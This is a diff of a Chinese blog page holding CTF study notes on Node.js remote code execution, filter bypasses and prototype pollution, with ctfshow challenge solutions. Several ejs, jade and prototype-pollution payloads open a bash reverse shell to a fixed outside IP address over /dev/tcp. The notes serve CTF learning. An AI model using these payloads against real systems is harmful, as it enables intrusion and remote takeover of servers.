@@ -20,20 +20,31 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# nodejs  # nodejs的rce  1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。 2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。 3. child_process.spawnSync()：该方法以同步方式提供等效的功能，其会阻塞事件循环">
+  <meta name="description" content="nodejs的rce 1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。 2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。 3. child_process.…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nodejs">
 <meta property="og:url" content="http://example.com/2026/09/16/37-nodejs/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# nodejs  # nodejs的rce  1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。 2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。 3. child_process.spawnSync()：该方法以同步方式提供等效的功能，其会阻塞事件循环">
+<meta property="og:description" content="nodejs的rce 1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。 2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。 3. child_process.…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/6e5a16fd-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/f27284f3-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/968158fe-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/37fbc157-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/a83ba500-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/e48222e3-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/edc2b78d-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/ad1d52d9-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/cfac2e0d-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/5641d3f8-image.png">
 <meta property="article:published_time" content="2026-09-16T14:20:04.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:20:04.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="RCE">
 <meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="Node.js">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/6e5a16fd-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/37-nodejs/">
 
@@ -235,6 +246,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">nodejs的rce 1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。 2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。 3. child_process.…</div>
 
         </div>
       </header>
@@ -245,180 +257,87 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# nodejs
+        <h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h1 id="nodejs的rce"><a href="#nodejs的rce" class="headerlink" title="nodejs的rce"></a>nodejs的rce</h1><ol>
+<li>child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。</li>
+<li>child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。</li>
+<li>child_process.spawnSync()：该方法以同步方式提供等效的功能，其会阻塞事件循环，知道衍生的进程退出或者终止。</li>
+<li>child_process.execSync():他是child_process.exec()的同步版本，它会阻塞Nodejs事件循环。</li>
+</ol>
+<p>child_process模块的使用例子如下：</p>
+<p><code>require(&quot;child_process&quot;).exec(&quot;whoami&quot;,function(err,stdout,stderr){console.log(stdout);});</code></p>
+<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>如果点被过滤可以用[]代替调用方法</p>
+<p><code>require(&quot;child_process&quot;)[exec](&quot;ls&quot;)</code></p>
+<p>拼接绕过</p>
+<p><code>require(&quot;child_process&quot;)[&quot;ex&quot;+&quot;ec&quot;](&quot;ls&quot;)</code></p>
+<p>16进制绕过</p>
+<p><code>require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63&quot;](&quot;ls&quot;)</code></p>
+<p>Unicode编码</p>
+<p><code>require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063&quot;](&quot;ls&quot;)</code></p>
+<p>concat拼接绕过：</p>
+<p><code>require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;ls&quot;)</code></p>
+<p>Base64编码绕过</p>
+<h2 id="Obejct-values"><a href="#Obejct-values" class="headerlink" title="Obejct.values"></a>Obejct.values</h2><p>object.values(obj)会返回一个数组,成员是参数对象自身的（不含继承的）所有可遍历属性的键,利用这个我们可以获取到child_process的方法,</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/6e5a16fd-image.png" alt="image.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>))[<span class="number">4</span>](&lt;<span class="string">&#x27;ls&#x27;</span>&gt;).<span class="title function_">tostring</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br></pre></td></tr></table></figure>
 
-# nodejs的rce
-
-1. child_process.exec():衍生shell并在该shell中运行命令，完成后将stdout和stderr传给回调函数。
-2. child_process.spawn():该方法异步衍生子进程，不会阻塞Nodejs事件循环。
-3. child_process.spawnSync()：该方法以同步方式提供等效的功能，其会阻塞事件循环，知道衍生的进程退出或者终止。
-4. child_process.execSync():他是child_process.exec()的同步版本，它会阻塞Nodejs事件循环。
-
-child_process模块的使用例子如下：
-
-`require("child_process").exec("whoami",function(err,stdout,stderr){console.log(stdout);});`
-
-## 过滤
-
-如果点被过滤可以用[]代替调用方法
-
-`require("child_process")[exec]("ls")`
-
-拼接绕过
-
-`require("child_process")["ex"+"ec"]("ls")`
-
-16进制绕过
-
-`require("child_process")["\x65\x78\x65\x63"]("ls")`
-
-Unicode编码
-
-`require("child_process")["\u0065\u0078\u0065\u0063"]("ls")`
-
-concat拼接绕过：
-
-`require("child_process")["exe".concat("cSync")]("ls")`
-
-Base64编码绕过
-
-## Obejct.values
-
-object.values(obj)会返回一个数组,成员是参数对象自身的（不含继承的）所有可遍历属性的键,利用这个我们可以获取到child_process的方法,
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/6e5a16fd-image.png)
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>))[<span class="number">4</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">tostring</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br></pre></td></tr></table></figure>
-
-另外一些形式的payload
-
-`global.process.mainModule.constructor._load('child_process').exec('calc')`
-
-# ejs
-
-payload
-
-1. `{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777/port 0>&1\"');var __tmp2"}}}`
-2. `{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}}`
-
-通过污染最上层影响整个模板
-
-# jade
-
-`
-
+<p>另外一些形式的payload</p>
+<p><code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code></p>
+<h1 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h1><p>payload</p>
+<ol>
+<li><code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}}</code></li>
+<li><code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;}}}</code></li>
+</ol>
+<p>通过污染最上层影响整个模板</p>
+<h1 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h1><p>&#96;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;self&quot;:&quot;true&quot;,&quot;line&quot;:&quot;2,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;&#125;&#125;</span><br><span class="line">2. </span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-# ctfshow
+<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="334"><a href="#334" class="headerlink" title="334"></a>334</h2><p>下载zip文件,在user.js文件里面有账号和密码,在登陆界面内登录即可</p>
+<h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>nodejs的rce</p>
+<p>payload&#x3D;<code>?eval=require(&quot;child_process&quot;).execSync(&#39;cat f*&#39;)</code></p>
+<h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>通过变量读取当前文件目录 __filename,过滤了exec,随便选一个绕过方式,+绕过的话要对+进行url编码,%2b</p>
+<p>__filename:给出绝对路径</p>
+<p>__dirname:当前目录的相对路径</p>
+<p>读取文件:<code>val=require(‘fs’).readFileSync(’/app/routes/index.js’,‘utf-8’)</code></p>
+<h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
 
-## 334
-
-下载zip文件,在user.js文件里面有账号和密码,在登陆界面内登录即可
-
-## 335
-
-nodejs的rce
-
-payload=`?eval=require("child_process").execSync('cat f*')`
-
-## 336
-
-通过变量读取当前文件目录 __filename,过滤了exec,随便选一个绕过方式,+绕过的话要对+进行url编码,%2b
-
-__filename:给出绝对路径
-
-__dirname:当前目录的相对路径
-
-读取文件:`val=require(‘fs’).readFileSync(’/app/routes/index.js’,‘utf-8’)`
-
-## 337
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
-
-`a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)`这串代码是关键信息
-
-传入a[:]=1&b[:]=2即可绕过,a与中括号内的内容要相同
-
-## 338
-
-### 原型链污染
-
-__proto__:对象的__proto__属性，指向类的原型对象prototype
-
-污染原型链,使对象去获取已经被污染了的原型,实现变量覆盖之类的
-
-本题下载压缩包,在app.js里面发现,在routes文件夹里面有源码和登录源码,
-
+<p><code>a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code>这串代码是关键信息</p>
+<p>传入a[:]&#x3D;1&amp;b[:]&#x3D;2即可绕过,a与中括号内的内容要相同</p>
+<h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p><strong>proto</strong>:对象的__proto__属性，指向类的原型对象prototype</p>
+<p>污染原型链,使对象去获取已经被污染了的原型,实现变量覆盖之类的</p>
+<p>本题下载压缩包,在app.js里面发现,在routes文件夹里面有源码和登录源码,</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> res.json(&#123;ret_code: <span class="number">2</span>, ret_msg: <span class="string">&#x27;登录失败&#x27;</span>+JSON.stringify(user)&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-关键是要使secert的原型链的ctfshow污染为36dboy,通过if判断,burpsuite抓包修改为下图再发包即可
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/f27284f3-image.png)
-
-注:nodejs的环境容易崩掉,只能打一次,否则需要重启靶场
-
-## 339
-
-在login文件里只设置了一个虚假的flag,我们需要在login文件进行原型链污染,再调用api路由的
-
+<p>关键是要使secert的原型链的ctfshow污染为36dboy,通过if判断,burpsuite抓包修改为下图再发包即可</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/f27284f3-image.png" alt="image.png"></p>
+<p>注:nodejs的环境容易崩掉,只能打一次,否则需要重启靶场</p>
+<h2 id="339"><a href="#339" class="headerlink" title="339"></a>339</h2><p>在login文件里只设置了一个虚假的flag,我们需要在login文件进行原型链污染,再调用api路由的</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
-Function()匿名函数:
+<p>Function()匿名函数:</p>
+<p><code>Function(&quot;return x;&quot;);</code>,匿名函数特性,需要有return</p>
+<p>api中的函数相当于嵌套,将后一个括号的内容当作参数给第一个括号,可以在此进行变量覆盖</p>
+<p>payload:<code>{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 0&gt;&amp;1\&quot;&#39;)&quot;}}</code></p>
+<p>反弹shell</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/968158fe-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/37fbc157-image.png" alt="image.png"></p>
+<p>监听到了后,ls没有找到相关文件,查看evn 配置文件,在其中找到flag</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/a83ba500-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/e48222e3-image.png" alt="image.png"></p>
+<h2 id="340"><a href="#340" class="headerlink" title="340"></a>340</h2><p>跟上一题比较,套了两层,需要污染两层原型链</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/edc2b78d-image.png" alt="image.png"></p>
+<p>从login文件可以看出</p>
+<p>payload&#x3D;<code>{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 0&gt;&amp;1\&quot;&#39;)&quot;}}}</code></p>
+<p>剩下的步骤等同于上一题</p>
+<h1 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    this.name = <span class="string">&#x27;kevin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(this.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> <span class="title class_">Parent</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(child1.<span class="title function_ invoke__">getName</span>()) <span class="comment">// kevin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-`Function("return x;");`,匿名函数特性,需要有return
-
-api中的函数相当于嵌套,将后一个括号的内容当作参数给第一个括号,可以在此进行变量覆盖
-
-payload:`{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 0>&1\"')"}}`
-
-反弹shell
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/968158fe-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/37fbc157-image.png)
-
-监听到了后,ls没有找到相关文件,查看evn 配置文件,在其中找到flag
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/a83ba500-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/e48222e3-image.png)
-
-## 340
-
-跟上一题比较,套了两层,需要污染两层原型链
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/edc2b78d-image.png)
-
-从login文件可以看出
-
-payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 0>&1\"')"}}}`
-
-剩下的步骤等同于上一题
-
-# 原型链污染
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    this.name = <span class="string">&#x27;kevin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(this.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> <span class="title class_">Parent</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(child1.<span class="title function_ invoke__">getName</span>()) <span class="comment">// kevin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-当「方法」的 prototype 指定对象原型之后，当试图访问该类的对象属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾,类似于会去找自己的父类,一层层往上寻找
-
-## merge(a.b)
-
-把右边的所有对象属性赋值给左边
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/ad1d52d9-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/cfac2e0d-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/5641d3f8-image.png)
-
-变量覆盖,原型链污染
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ee7g8p4436vti0ie
-语雀文档ID: 148315327
-
+<p>当「方法」的 prototype 指定对象原型之后，当试图访问该类的对象属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾,类似于会去找自己的父类,一层层往上寻找</p>
+<h2 id="merge-a-b"><a href="#merge-a-b" class="headerlink" title="merge(a.b)"></a>merge(a.b)</h2><p>把右边的所有对象属性赋值给左边</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/ad1d52d9-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/cfac2e0d-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/5641d3f8-image.png" alt="image.png"></p>
+<p>变量覆盖,原型链污染</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ee7g8p4436vti0ie">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/ee7g8p4436vti0ie</a><br>语雀文档ID: 148315327</p>
 
     </div>
 
@@ -428,9 +347,9 @@ payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.co
 
       <footer class="post-footer">
           <div class="post-tags">
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
               <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/Node-js/" rel="tag"># Node.js</a>
           </div>
 
         
@@ -443,8 +362,8 @@ payload=`{"__proto__":{"__proto__":{"query":"return global.process.mainModule.co
       <i class="fa fa-chevron-left"></i> XSS
     </a></div>
       <div class="post-nav-item">
-    <a href="/2026/09/16/38-SSRF/" rel="next" title="SSRF">
-      SSRF <i class="fa fa-chevron-right"></i>
+    <a href="/2026/09/16/39-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/" rel="next" title="命令执行做题总结">
